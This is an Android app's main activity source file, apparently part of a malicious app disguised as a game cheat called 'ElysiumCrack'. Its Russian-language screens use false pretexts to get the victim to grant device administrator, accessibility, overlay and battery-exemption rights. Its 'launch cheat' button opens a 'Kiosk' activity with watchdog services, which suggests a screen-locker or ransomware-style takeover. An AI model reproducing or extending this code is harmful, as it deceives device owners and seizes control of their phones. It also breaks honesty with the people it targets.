package com.elysium.crack;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int REQ_NOTIF = 100;
    private boolean isMainMenu = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Останавливаем старые сервисы
        stopService(new Intent(this, KioskService.class));
        stopService(new Intent(this, WatchdogService.class));
        
        // Запрос на отключение оптимизации батареи
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                try { startActivity(intent); } catch (Throwable ignored) {}
            }
        }
        
        showIntroScreen();
    }

    private LinearLayout createBackgroundLayout() {
        FrameLayout root = new FrameLayout(this);
        View bg = new View(this);
        bg.setBackgroundResource(R.drawable.bg);
        root.addView(bg, new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));

        View dimmer = new View(this);
        dimmer.setBackgroundColor(Color.parseColor("#99000000"));
        root.addView(dimmer, new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);
        content.setPadding(60, 0, 60, 0);
        root.addView(content, new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));

        root.setTag(content);
        return content;
    }

    private void showIntroScreen() {
        isMainMenu = false;
        LinearLayout ll = createBackgroundLayout();

        TextView title = new TextView(this);
        title.setText("ElysiumCrack");
        title.setTextColor(Color.WHITE);
        title.setTextSize(36);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        ll.addView(title);

        TextView info = new TextView(this);
        info.setText("Для успешного инжекта чита в игру\nнам нужны системные разрешения.\nБез них приложение не сможет\nвнедриться в процесс игры.");
        info.setTextColor(Color.parseColor("#DDDDDD"));
        info.setTextSize(18);
        info.setGravity(Gravity.CENTER);
        info.setPadding(0, 40, 0, 60);
        info.setLineSpacing(10, 1);
        ll.addView(info);

        Button btnOk = createBtn("ОК, ДАТЬ РАЗРЕШЕНИЯ", Color.parseColor("#1B5E20"));
        btnOk.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        ll.addView(btnOk);

        setContentView(((View) ll.getParent()));
    }

    private void requestAllPermissions() {
        // 1. Оверлей
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Выдай разрешение Overlay", Toast.LENGTH_SHORT).show();
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
            return;
        }

        // 2. Админ
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(componentName())) {
            Toast.makeText(this, "Активируй Администратора", Toast.LENGTH_SHORT).show();
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName());
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Для инжекта чита");
            startActivity(i);
            return;
        }

        // 3. Accessibility (Спец. возможности)
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Включи Службу специальных возможностей для защиты", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            return;
        }

        // 4. Уведомления (Android 13+)
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Дай разрешение на уведомления", Toast.LENGTH_SHORT).show();
                requestPermissions(new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIF);
                return;
            }
        }

        showMainMenu();
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return prefString != null && prefString.contains(getPackageName() + "/" + KioskAccessibilityService.class.getName());
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_NOTIF) {
            requestAllPermissions();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(componentName()) && isMainMenu) {
            isMainMenu = false;
            showIntroScreen();
        }
    }

    private void showMainMenu() {
        isMainMenu = true;
        LinearLayout ll = createBackgroundLayout();

        TextView title = new TextView(this);
        title.setText("ELYSIUM\nCRACK");
        title.setTextColor(Color.parseColor("#FF4444"));
        title.setTextSize(50);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setLineSpacing(0, 0.9f);
        ll.addView(title);

        TextView status = new TextView(this);
        status.setText("\nСтатус: ГОТОВ К ИНЖЕКТУ\nВерсия: 1.10");
        status.setTextColor(Color.parseColor("#00FF00"));
        status.setTextSize(16);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 20, 0, 80);
        ll.addView(status);

        Button btnLaunch = createBtn("ЗАПУСТИТЬ ЧИТ", Color.parseColor("#FF4444"));
        btnLaunch.setTextSize(22);
        btnLaunch.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                startActivity(new Intent(MainActivity.this, KioskActivity.class));
                finish();
            }
        });
        ll.addView(btnLaunch);

        TextView subText = new TextView(this);
        subText.setText("Размер приложения оптимизирован.\nВсе текстуры, конфиги и энкодеры\nподгружаются с защищенного сервера\nпрямо во время игры в оперативную память.");
        subText.setTextColor(Color.parseColor("#888888"));
        subText.setTextSize(12);
        subText.setGravity(Gravity.CENTER);
        subText.setPadding(0, 30, 0, 0);
        subText.setLineSpacing(5, 1);
        ll.addView(subText);

        setContentView(((View) ll.getParent()));
    }

    private Button createBtn(String text, int color) {
        Button b = new Button(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 15, 0, 15);
        b.setLayoutParams(lp);
        GradientDrawable shape = new GradientDrawable();
        shape.setShape(GradientDrawable.RECTANGLE);
        shape.setCornerRadius(30);
        shape.setColor(color);
        b.setBackground(shape);
        b.setText(text);
        b.setTextColor(Color.WHITE);
        b.setTypeface(null, Typeface.BOLD);
        b.setPadding(0, 40, 0, 40);
        return b;
    }

    private ComponentName componentName() {
        return new ComponentName(this, AdminReceiver.class);
    }
}
